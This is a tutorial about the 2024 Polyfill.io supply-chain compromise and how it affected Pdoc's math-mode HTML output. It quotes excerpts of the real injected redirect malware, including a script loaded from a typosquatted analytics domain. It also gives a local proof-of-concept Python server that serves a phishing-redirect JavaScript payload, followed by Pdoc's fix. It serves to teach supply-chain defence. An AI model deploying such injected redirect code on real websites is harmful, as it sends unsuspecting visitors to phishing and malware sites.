---
title: Real Example 1
---

## Pdoc and Polyfill.io

Third-party libraries are pre-built components that developers can integrate into their projects to simplify complex tasks and speed up development. However, they come with inherent risks, as they are created and maintained outside the project. If third-party libraries are not maintained properly, they can introduce vulnerabilities that can be exploited by malicious users.

To understand the risks associated with third-party libraries, we will explore a real example involving Pdoc and `Polyfill.io`. Pdoc is a Python library used to generate documentation, and it relied on the `Polyfill.io` CDN to ensure compatibility across browsers. In this real example, we will learn how `Polyfill.io` was compromised to inject code in applications like Pdoc.

## Polyfills

In software development, a polyfill is code that implements a new standard feature in an old environment. This is a common practice done on older browsers to add support for modern features. For example, if a browser lacks support for a specific JavaScript function or HTML element, a polyfill can mimic that function, giving users of older browsers the same experience.

Let's say we need to use the `Math.trunc` function. This would "cut off" the decimal part of an integer. For example, `Math.trunc(1.23)` returns `1`. However, older browsers might not support this function. To add support, we could implement a polyfill to mimic the `Math.trunc` function.

```javascript
// Check if Math.trunc is supported
if (!Math.trunc) {
    // Implement the polyfill
    Math.trunc = function(number) {
        return number < 0 ? Math.ceil(number) : Math.floor(number);
    }
}
```

In general, polyfills are particularly valuable in a rapidly evolving ecosystem, where maintaining broad compatibility is essential to reach large user bases.

## Polyfill.io

`Polyfill.io` was one service designed to simplify the use of polyfills. It provided a solution that delivered only necessary scripts based on the specific features needed by the user's browser. This tool proved to be convenient for developers aiming to reach users with low overhead.

Developers would integrate `Polyfill.io` by adding a script tag in their HTML files. This script would dynamically fetch the appropriate polyfills, but developers could also indicate the particular features they needed like `ES6`.

```html
<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
```

However, the original author of `Polyfill.io` never owned the domain name. Without influence over its sale, `Polyfill.io` was eventually sold to a Chinese company called Funnull in February 2024. On June 25, 2024, the Sansec forensics team reported a supply chain attack on `Polyfill.io` after the service started redirecting users to malicious sites and injecting malware.

The people that were targeted in this attack were mobile users. When these users accessed compromised websites, the injected code would first check what device they were using to set up an appropriate redirection URL.

```javascript
function check_tiaozhuan() {
  var _isMobile = navigator.userAgent.match(
    /(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i
  );
  if (_isMobile) {
    var _curHost = window.location.host,
      _ref = document.referrer,
      _redirectURL = "",
      _kuurzaBitGet = "https://kuurza.com/redirect?from=bitget",
      _rnd = Math.floor(Math.random() * 100 + 1),
      _date = new Date(),
      _hours = _date.getHours();
```

Before the user is redirected, the `vfed_update` function would load a script from a fake Google Analytics domain and redirect if `usercache` is true.

```javascript
function vfed_update(_0x5ae1f8) {
  _0x5ae1f8 !== "" &&
    loadJS(
      "https://www.googie-anaiytics.com/html/checkcachehw.js",
      function () {
        if (usercache == true) {
          window.location.href = _0x5ae1f8;
        }
      }
    );
}
```

By targeting a widely used service like Polyfill.io, the attackers managed to inject malware and exploit more than 100 thousand websites. This highlights the importance of continuously monitoring third-party libraries to be safe.

## Pdoc

In the context of Pdoc, a Python library used to generate documentation, one of the features they included was a math render mode using MathJax. This was particular useful for users that required precise math notation.

```bash
# Enable math mode with --math flag
pdoc --math example.py
```

However, Pdoc was vulnerable because they relied on `Polyfill.io` to provide polyfills for browsers that lacked support for modern features required by MathJax. When users enabled math mode, the HTML output included a script tag that loaded `Polyfill.io`, recommended by MathJax.

```html
{# This template is included in math mode and loads MathJax for formula rendering. #}

...

<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
<script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
```

As a result, users of Pdoc who enabled math mode had harmful code injected after `Polyfill.io` was compromised.

## Proof of Concept

To better understand how Pdoc users were impacted, we can create a compromised server to simulate how malicious JavaScript was injected. We start by creating a simple Python program to act as the victim of this attack.

```python
# Save this as example.py
def example_function():
    """
    This is am example function.
    """
    pass
```

Then, we install a vulnerable version of Pdoc and use Pdoc to generate documentation with math mode enabled for the victim website.

```bash
python -m pip install pdoc==14.5.0
```

```bash
python -m pdoc --math example.py -o ./docs
```

In the HTML output, we can then modify `example.html` by replacing the `Polyfill.io` link with our own server at `http://localhost:8000`.

```html
<!-- Find the following line in your generated HTML --> 
<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> 

<!-- Replace it with -->
<script src="http://localhost:8000"></script>
```

To exploit the vulnerability in the victim program, we can create a script that sets up a malicious HTTP server using Python's `http.server` and `socketserver` modules. This will listen for GET requests and inject harmful code when the victim website is loaded in the user's browser.

```python
import http.server
import socketserver

class MaliciousHandler(http.server.SimpleHTTPRequestHandler):

    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "application/javascript")
        self.end_headers()

        # Malicious JavaScript payload
        malicious_js = """
        (function() {
            // Redirect to phishing site after 10 seconds
            setTimeout(function() {
                window.location.href = 'http://phishing-site.example.com';
            }, 10000);
        })();
        """
        self.wfile.write(malicious_js.encode('utf-8'))


if __name__ == "__main__":
    with socketserver.TCPServer(("", 8000), MaliciousHandler) as httpd:
        print("Serving malicious script at port 8000")
        httpd.serve_forever()
```

In this example, we redirect the user to another website after some time. This simulates a simplified version of the attack done by `Polyfill.io`.

![image](https://ik.imagekit.io/14sfaswy6hrz/images/clyc2v0ncxs2f1gmw0kwpbyzo.png)

## Mitigations

To address the attacks done by `Polyfill.io`, the maintainers of Pdoc decided to remove the reference to `Polyfill.io` entirely. This was done to ensure no vulnerabilities are included in the documentation output.

```diff
{# This template is included in math mode and loads MathJax for formula rendering. #}

...

- <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
<script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
```

As a result, users can now determine if they need polyfills in their documentation and do not need to depend on `Polyfill.io` specifically.

The real example involving Pdoc and `Polyfill.io` demonstrates how third-party libraries can introduce vulnerabilities that compromise the application. By staying on top of updates and security patches on the libraries we use, we can protect our applications from similar threats.
